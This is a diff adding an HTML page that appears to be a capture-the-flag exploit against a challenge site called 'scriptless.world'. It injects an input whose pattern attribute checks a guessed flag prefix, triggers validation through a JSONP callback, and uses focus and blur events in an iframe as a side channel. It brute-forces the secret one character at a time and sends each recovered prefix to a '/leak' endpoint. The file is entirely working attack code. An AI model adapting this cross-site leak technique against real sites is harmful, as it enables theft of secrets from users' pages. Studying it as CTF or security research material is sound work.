@@ -1,0 +1,40 @@
+<body onblur="blur_sice()">
+    <iframe id='hackframe' onload="frame_load()"></iframe>
+    <script>
+        let sice_url = `https://scriptless.world/?name=<script src='/hire?callback=sice.reportValidity' defer></sc` + `ript><input id=sice name=hax pattern=".*CTF-BR\\{REPLACEME.*" value='pepega`;
+        console.log(sice_url);
+        let charset = "_!abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        let current_known = "p4tt3rn5_plu5_f0cu5_3qu4l5_s1de_ch4nn"
+        let hackframe = document.getElementById('hackframe');
+
+        let did_blur;
+        let current_idx = 0;
+
+        function try_char(idx){
+            did_blur = false;
+            hackframe.src = sice_url.replace("REPLACEME", current_known+charset[idx]);
+        }
+
+        function frame_load(){
+            setTimeout(function(){
+                if(!did_blur){
+                    current_known += charset[current_idx];
+                    fetch('/leak?'+current_known);
+                    current_idx = 0;
+                    try_char(current_idx);
+                }
+                else{
+                    current_idx += 1;
+                    document.activeElement.blur();
+                    try_char(current_idx);
+                }
+            }, 50);
+        }
+
+        function blur_sice(){
+            did_blur = true;
+        }
+
+        try_char(current_idx);
+    </script>
+</body>
